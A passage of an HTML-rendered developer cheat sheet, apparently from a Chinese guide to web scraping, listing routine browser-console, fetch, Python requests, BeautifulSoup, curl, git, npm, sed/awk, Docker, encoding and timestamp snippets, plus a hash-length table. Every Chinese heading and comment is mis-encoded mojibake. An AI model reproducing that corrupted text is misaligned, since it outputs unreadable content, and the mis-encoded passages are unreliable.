class="nx">toUTCString</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;;path=/&quot;</span><span class="p">);</span>
<span class="p">});</span>

<span class="c1">// æŸ¥çœ‹ LocalStorage</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">)</span>

<span class="c1">// æ¸…ç©º LocalStorage</span>
<span class="nx">localStorage</span><span class="p">.</span><span class="nx">clear</span><span class="p">()</span>

<span class="c1">// å‘é€ GET è¯·æ±‚</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">)</span>

<span class="c1">// å‘é€ POST è¯·æ±‚</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
<span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;123456&#39;</span><span class="p">})</span>
<span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="python-å¸¸ç”¨åº“">Python å¸¸ç”¨åº“</h2>

      <h3 id="requests">Requests</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="c1"># GET è¯·æ±‚</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># POST è¯·æ±‚</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://example.com/api&#39;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
    <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;123456&#39;</span>
<span class="p">})</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>

<span class="c1"># è®¾ç½® Headers</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 ...&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="s1">&#39;Bearer token123&#39;</span>
<span class="p">}</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ä»£ç†</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://127.0.0.1:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;http://127.0.0.1:8080&#39;</span>
<span class="p">}</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>

<span class="c1"># Session ä¿æŒ</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">)</span>
<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://example.com/api&#39;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="s1">&#39;value&#39;</span><span class="p">})</span>
</code></pre>
      </div>

      <h3 id="beautifulsoup">BeautifulSoup</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="c1"># è§£æ HTML</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>

<span class="c1"># æŸ¥æ‰¾å…ƒç´ </span>
<span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">,</span> <span class="n">class_</span><span class="o">=</span><span class="s1">&#39;content&#39;</span><span class="p">)</span>          <span class="c1"># æŸ¥æ‰¾ç¬¬ä¸€ä¸ª</span>
<span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>                          <span class="c1"># æŸ¥æ‰¾æ‰€æœ‰</span>
<span class="n">soup</span><span class="o">.</span><span class="n">select</span><span class="p">(</span><span class="s1">&#39;.class #id tag&#39;</span><span class="p">)</span>               <span class="c1"># CSS é€‰æ‹©å™¨</span>

<span class="c1"># è·å–å±æ€§</span>
<span class="n">element</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">element</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">)</span>                         <span class="c1"># è·å– href</span>
<span class="n">element</span><span class="o">.</span><span class="n">text</span>                                <span class="c1"># è·å–æ–‡æœ¬</span>
<span class="n">element</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>                <span class="c1"># è·å–æ–‡æœ¬ï¼ˆå»ç©ºæ ¼ï¼‰</span>
</code></pre>
      </div>

      <h3 id="regex-re">Regex (re)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="c1"># æŸ¥æ‰¾</span>
<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;pattern&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
<span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;pattern&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>

<span class="c1"># æ›¿æ¢</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;old&#39;</span><span class="p">,</span> <span class="s1">&#39;new&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>

<span class="c1"># ç¼–è¯‘ï¼ˆæé«˜æ€§èƒ½ï¼‰</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;pattern&#39;</span><span class="p">)</span>
<span class="n">matches</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="curl-å‘½ä»¤">cURL å‘½ä»¤</h2>

      <h3 id="åŸºæœ¬ç”¨æ³•">åŸºæœ¬ç”¨æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># GET è¯·æ±‚</span>
curl<span class="w"> </span>https://example.com

<span class="c1"># POST è¯·æ±‚</span>
curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://example.com/api<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;}&#39;</span>

<span class="c1"># è®¾ç½® User-Agent</span>
curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;Mozilla/5.0 ...&quot;</span><span class="w"> </span>https://example.com

<span class="c1"># ä¿å­˜ Cookie</span>
curl<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span>https://example.com

<span class="c1"># ä½¿ç”¨ Cookie</span>
curl<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span>https://example.com

<span class="c1"># è·Ÿéšé‡å®šå‘</span>
curl<span class="w"> </span>-L<span class="w"> </span>https://example.com

<span class="c1"># æ˜¾ç¤ºå“åº”å¤´</span>
curl<span class="w"> </span>-i<span class="w"> </span>https://example.com

<span class="c1"># åªæ˜¾ç¤ºå“åº”å¤´</span>
curl<span class="w"> </span>-I<span class="w"> </span>https://example.com

<span class="c1"># ä½¿ç”¨ä»£ç†</span>
curl<span class="w"> </span>-x<span class="w"> </span>http://127.0.0.1:8080<span class="w"> </span>https://example.com

<span class="c1"># å¿½ç•¥ SSL è¯ä¹¦</span>
curl<span class="w"> </span>-k<span class="w"> </span>https://example.com

<span class="c1"># ä¸Šä¼ æ–‡ä»¶</span>
curl<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;file=@/path/to/file&quot;</span><span class="w"> </span>https://example.com/upload
</code></pre>
      </div>

      <h3 id="è°ƒè¯•ç”¨æ³•">è°ƒè¯•ç”¨æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span>
curl<span class="w"> </span>-v<span class="w"> </span>https://example.com

<span class="c1"># æ˜¾ç¤ºæ—¶é—´ç»Ÿè®¡</span>
curl<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;@curl-format.txt&quot;</span><span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-s<span class="w"> </span>https://example.com

<span class="c1"># curl-format.txt å†…å®¹:</span>
<span class="c1">#     time_namelookup:  %{time_namelookup}\n</span>
<span class="c1">#        time_connect:  %{time_connect}\n</span>
<span class="c1">#     time_appconnect:  %{time_appconnect}\n</span>
<span class="c1">#       time_redirect:  %{time_redirect}\n</span>
<span class="c1">#    time_pretransfer:  %{time_pretransfer}\n</span>
<span class="c1">#  time_starttransfer:  %{time_starttransfer}\n</span>
<span class="c1">#                     ----------\n</span>
<span class="c1">#          time_total:  %{time_total}\n</span>
</code></pre>
      </div>

      <hr />

      <h2 id="git-å¸¸ç”¨å‘½ä»¤">Git å¸¸ç”¨å‘½ä»¤</h2>

      <h3 id="åŸºç¡€æ“ä½œ">åŸºç¡€æ“ä½œ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æŸ¥çœ‹çŠ¶æ€</span>
git<span class="w"> </span>status

<span class="c1"># æ·»åŠ æ–‡ä»¶</span>
git<span class="w"> </span>add<span class="w"> </span>.
git<span class="w"> </span>add<span class="w"> </span>file.txt

<span class="c1"># æäº¤</span>
git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;message&quot;</span>

<span class="c1"># æ¨é€</span>
git<span class="w"> </span>push<span class="w"> </span>origin<span class="w"> </span>master

<span class="c1"># æ‹‰å–</span>
git<span class="w"> </span>pull<span class="w"> </span>origin<span class="w"> </span>master

<span class="c1"># æŸ¥çœ‹å†å²</span>
git<span class="w"> </span>log
git<span class="w"> </span>log<span class="w"> </span>--oneline<span class="w"> </span>--graph

<span class="c1"># å›é€€</span>
git<span class="w"> </span>reset<span class="w"> </span>--hard<span class="w"> </span>HEAD^<span class="w">       </span><span class="c1"># å›é€€ä¸€ä¸ªç‰ˆæœ¬</span>
git<span class="w"> </span>reset<span class="w"> </span>--hard<span class="w"> </span>commit_id<span class="w">   </span><span class="c1"># å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬</span>
</code></pre>
      </div>

      <h3 id="åˆ†æ”¯æ“ä½œ">åˆ†æ”¯æ“ä½œ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åˆ›å»ºåˆ†æ”¯</span>
git<span class="w"> </span>branch<span class="w"> </span>feature-name

<span class="c1"># åˆ‡æ¢åˆ†æ”¯</span>
git<span class="w"> </span>checkout<span class="w"> </span>feature-name

<span class="c1"># åˆ›å»ºå¹¶åˆ‡æ¢</span>
git<span class="w"> </span>checkout<span class="w"> </span>-b<span class="w"> </span>feature-name

<span class="c1"># åˆå¹¶åˆ†æ”¯</span>
git<span class="w"> </span>merge<span class="w"> </span>feature-name

<span class="c1"># åˆ é™¤åˆ†æ”¯</span>
git<span class="w"> </span>branch<span class="w"> </span>-d<span class="w"> </span>feature-name
</code></pre>
      </div>

      <h3 id="æŸ¥çœ‹å·®å¼‚">æŸ¥çœ‹å·®å¼‚</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æŸ¥çœ‹ä¿®æ”¹</span>
git<span class="w"> </span>diff

<span class="c1"># æŸ¥çœ‹å·²æš‚å­˜çš„ä¿®æ”¹</span>
git<span class="w"> </span>diff<span class="w"> </span>--staged

<span class="c1"># æŸ¥çœ‹ä¸¤ä¸ªæäº¤çš„å·®å¼‚</span>
git<span class="w"> </span>diff<span class="w"> </span>commit1<span class="w"> </span>commit2
</code></pre>
      </div>

      <hr />

      <h2 id="nodejs-npm">Node.js / npm</h2>

      <h3 id="åŒ…ç®¡ç†">åŒ…ç®¡ç†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å®‰è£…åŒ…</span>
npm<span class="w"> </span>install<span class="w"> </span>package-name
npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>package-name<span class="w">     </span><span class="c1"># å…¨å±€å®‰è£…</span>
npm<span class="w"> </span>install<span class="w"> </span>--save-dev<span class="w"> </span>package<span class="w">  </span><span class="c1"># å¼€å‘ä¾èµ–</span>

<span class="c1"># å¸è½½åŒ…</span>
npm<span class="w"> </span>uninstall<span class="w"> </span>package-name

<span class="c1"># æ›´æ–°åŒ…</span>
npm<span class="w"> </span>update<span class="w"> </span>package-name

<span class="c1"># æŸ¥çœ‹å·²å®‰è£…çš„åŒ…</span>
npm<span class="w"> </span>list
npm<span class="w"> </span>list<span class="w"> </span>-g

<span class="c1"># æŸ¥çœ‹åŒ…ä¿¡æ¯</span>
npm<span class="w"> </span>info<span class="w"> </span>package-name
</code></pre>
      </div>

      <h3 id="å¸¸ç”¨è„šæœ¬">å¸¸ç”¨è„šæœ¬</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¿è¡Œè„šæœ¬</span>
npm<span class="w"> </span>run<span class="w"> </span>script-name

<span class="c1"># å¸¸è§çš„é¢„å®šä¹‰è„šæœ¬</span>
npm<span class="w"> </span>start
npm<span class="w"> </span><span class="nb">test</span>
npm<span class="w"> </span>run<span class="w"> </span>build
</code></pre>
      </div>

      <hr />

      <h2 id="bash-æ–‡æœ¬å¤„ç†">Bash æ–‡æœ¬å¤„ç†</h2>

      <h3 id="grep">grep</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æœç´¢æ–‡æœ¬</span>
grep<span class="w"> </span><span class="s2">&quot;pattern&quot;</span><span class="w"> </span>file.txt

<span class="c1"># å¿½ç•¥å¤§å°å†™</span>
grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;pattern&quot;</span><span class="w"> </span>file.txt

<span class="c1"># é€’å½’æœç´¢</span>
grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;pattern&quot;</span><span class="w"> </span>directory/

<span class="c1"># æ˜¾ç¤ºè¡Œå·</span>
grep<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;pattern&quot;</span><span class="w"> </span>file.txt

<span class="c1"># åå‘åŒ¹é…ï¼ˆä¸åŒ…å«ï¼‰</span>
grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;pattern&quot;</span><span class="w"> </span>file.txt

<span class="c1"># æ­£åˆ™è¡¨è¾¾å¼</span>
grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;regex pattern&quot;</span><span class="w"> </span>file.txt
</code></pre>
      </div>

      <h3 id="sed">sed</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ›¿æ¢æ–‡æœ¬</span>
sed<span class="w"> </span><span class="s1">&#39;s/old/new/&#39;</span><span class="w"> </span>file.txt<span class="w">           </span><span class="c1"># æ›¿æ¢æ¯è¡Œç¬¬ä¸€ä¸ª</span>
sed<span class="w"> </span><span class="s1">&#39;s/old/new/g&#39;</span><span class="w"> </span>file.txt<span class="w">          </span><span class="c1"># æ›¿æ¢æ‰€æœ‰</span>
sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s/old/new/g&#39;</span><span class="w"> </span>file.txt<span class="w">       </span><span class="c1"># ç›´æ¥ä¿®æ”¹æ–‡ä»¶</span>

<span class="c1"># åˆ é™¤è¡Œ</span>
sed<span class="w"> </span><span class="s1">&#39;/pattern/d&#39;</span><span class="w"> </span>file.txt<span class="w">           </span><span class="c1"># åˆ é™¤åŒ¹é…çš„è¡Œ</span>
sed<span class="w"> </span><span class="s1">&#39;1d&#39;</span><span class="w"> </span>file.txt<span class="w">                   </span><span class="c1"># åˆ é™¤ç¬¬ä¸€è¡Œ</span>
sed<span class="w"> </span><span class="s1">&#39;1,10d&#39;</span><span class="w"> </span>file.txt<span class="w">                </span><span class="c1"># åˆ é™¤1-10è¡Œ</span>
</code></pre>
      </div>

      <h3 id="awk">awk</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ‰“å°åˆ—</span>
awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="w"> </span>file.txt<span class="w">           </span><span class="c1"># æ‰“å°ç¬¬ä¸€åˆ—</span>
awk<span class="w"> </span><span class="s1">&#39;{print $1,$3}&#39;</span><span class="w"> </span>file.txt<span class="w">        </span><span class="c1"># æ‰“å°ç¬¬1å’Œç¬¬3åˆ—</span>

<span class="c1"># æ¡ä»¶è¿‡æ»¤</span>
awk<span class="w"> </span><span class="s1">&#39;$3 &gt; 100&#39;</span><span class="w"> </span>file.txt<span class="w">             </span><span class="c1"># ç¬¬3åˆ—å¤§äº100çš„è¡Œ</span>

<span class="c1"># æ±‚å’Œ</span>
awk<span class="w"> </span><span class="s1">&#39;{sum+=$1} END {print sum}&#39;</span><span class="w"> </span>file.txt
</code></pre>
      </div>

      <hr />

      <h2 id="docker-å¸¸ç”¨å‘½ä»¤">Docker å¸¸ç”¨å‘½ä»¤</h2>

      <h3 id="é•œåƒæ“ä½œ">é•œåƒæ“ä½œ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ‹‰å–é•œåƒ</span>
docker<span class="w"> </span>pull<span class="w"> </span>image-name

<span class="c1"># æŸ¥çœ‹é•œåƒ</span>
docker<span class="w"> </span>images

<span class="c1"># åˆ é™¤é•œåƒ</span>
docker<span class="w"> </span>rmi<span class="w"> </span>image-name

<span class="c1"># æ„å»ºé•œåƒ</span>
docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>image-name<span class="w"> </span>.
</code></pre>
      </div>

      <h3 id="å®¹å™¨æ“ä½œ">å®¹å™¨æ“ä½œ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¿è¡Œå®¹å™¨</span>
docker<span class="w"> </span>run<span class="w"> </span>-d<span class="w"> </span>--name<span class="w"> </span>container-name<span class="w"> </span>image-name
docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>image-name<span class="w"> </span>/bin/bash<span class="w">      </span><span class="c1"># äº¤äº’å¼</span>

<span class="c1"># æŸ¥çœ‹å®¹å™¨</span>
docker<span class="w"> </span>ps<span class="w">           </span><span class="c1"># è¿è¡Œä¸­çš„</span>
docker<span class="w"> </span>ps<span class="w"> </span>-a<span class="w">        </span><span class="c1"># æ‰€æœ‰çš„</span>

<span class="c1"># åœæ­¢å®¹å™¨</span>
docker<span class="w"> </span>stop<span class="w"> </span>container-name

<span class="c1"># å¯åŠ¨å®¹å™¨</span>
docker<span class="w"> </span>start<span class="w"> </span>container-name

<span class="c1"># åˆ é™¤å®¹å™¨</span>
docker<span class="w"> </span>rm<span class="w"> </span>container-name

<span class="c1"># æŸ¥çœ‹æ—¥å¿—</span>
docker<span class="w"> </span>logs<span class="w"> </span>container-name

<span class="c1"># è¿›å…¥å®¹å™¨</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>container-name<span class="w"> </span>/bin/bash
</code></pre>
      </div>

      <hr />

      <h2 id="å¿«é€Ÿå‚è€ƒ">å¿«é€Ÿå‚è€ƒ</h2>

      <h3 id="ç¼–ç è§£ç ">ç¼–ç /è§£ç </h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Base64</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;text&#39;</span><span class="p">)</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>

<span class="c1"># URLç¼–ç </span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">unquote</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="s1">&#39;text with spaces&#39;</span><span class="p">)</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>

<span class="c1"># JSON</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="n">json_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="s1">&#39;value&#39;</span><span class="p">})</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_str</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="æ—¶é—´æˆ³">æ—¶é—´æˆ³</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>

<span class="c1"># å½“å‰æ—¶é—´æˆ³ï¼ˆç§’ï¼‰</span>
<span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

<span class="c1"># å½“å‰æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</span>
<span class="n">timestamp_ms</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>

<span class="c1"># æ—¶é—´æˆ³è½¬æ—¥æœŸ</span>
<span class="n">dt</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">dt</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">))</span>

<span class="c1"># æ—¥æœŸè½¬æ—¶é—´æˆ³</span>
<span class="n">dt</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">2024</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">dt</span><span class="o">.</span><span class="n">timestamp</span><span class="p">())</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// JavaScript</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w">                    </span><span class="c1">// æ¯«ç§’</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">timestampSec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">)</span><span class="w">  </span><span class="c1">// ç§’</span>

<span class="c1">// æ—¶é—´æˆ³è½¬æ—¥æœŸ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">date</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">(</span><span class="nx">timestamp</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">date</span><span class="p">.</span><span class="nx">toLocaleString</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#08-Cheat-Sheets-crypto-signatures">åŠ å¯†ç®—æ³•ç‰¹å¾</a> - åŠ å¯†ç®—æ³•è¯†åˆ«</li>
        <li><a href="#08-Cheat-Sheets-regex-patterns">æ­£åˆ™è¡¨è¾¾å¼</a> - å¸¸ç”¨æ­£åˆ™æ¨¡å¼</li>
        <li><a href="#08-Cheat-Sheets-http-headers">HTTP å¤´é€ŸæŸ¥</a> - HTTP è¯·æ±‚å¤´</li>
      </ul>

    </div>

    <div class="section" id="08-Cheat-Sheets-crypto-signatures">
      <h2>64. Crypto Signatures</h2>
      <h1 id="åŠ å¯†ç®—æ³•ç‰¹å¾é€ŸæŸ¥è¡¨">åŠ å¯†ç®—æ³•ç‰¹å¾é€ŸæŸ¥è¡¨</h1>

      <h2 id="è¾“å‡ºé•¿åº¦ç‰¹å¾">è¾“å‡ºé•¿åº¦ç‰¹å¾</h2>

      <table>
        <thead>
          <tr>
            <th>ç®—æ³•</th>
            <th>è¾“å‡ºé•¿åº¦</th>
            <th>è¾“å‡ºæ ¼å¼</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>MD5</strong></td>
            <td>32å­—ç¬¦</td>
            <td>åå…­è¿›åˆ¶</td>
            <td><code>5d41402abc4b2a76b9719d911017c592</code></td>
          </tr>
          <tr>
            <td><strong>SHA1</strong></td>
            <td>40å­—ç¬¦</td>
            <td>åå…­è¿›åˆ¶</td>
            <td><code>aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d</code></td>
          </tr>
          <tr>
            <td><strong>SHA256</strong></td>
            <td>64å­—ç¬¦</td>
            <td>åå…­è¿›åˆ¶</td>
            <td><code>e3b0c44298fc1c149afbf4c8996fb...</code></td>
          </tr>
          <tr>
            <td><strong>SHA512</strong></td>
            <td>128å­—ç¬¦</td>
            <td>åå…­è¿›åˆ¶</td>
            <td><code>cf83e1357eefb8bdf1542850d66d8...</code></td>
          </tr>
          <tr>
            <td><strong>AES</strong></td>
            <td>å¯å˜</td>
            <td>Base64</td>
            <td><code>U2FsdGVkX1+LpXMIpGBwDA==</code></td>
          </tr>
          <tr>
            <td><strong>RSA-2048</strong></td>
            <td>256å­—èŠ‚</td>
            <td>Base64</td>
            <td>é•¿å­—ç¬¦ä¸²</td>
          </tr>
        </tbody>
      </table>

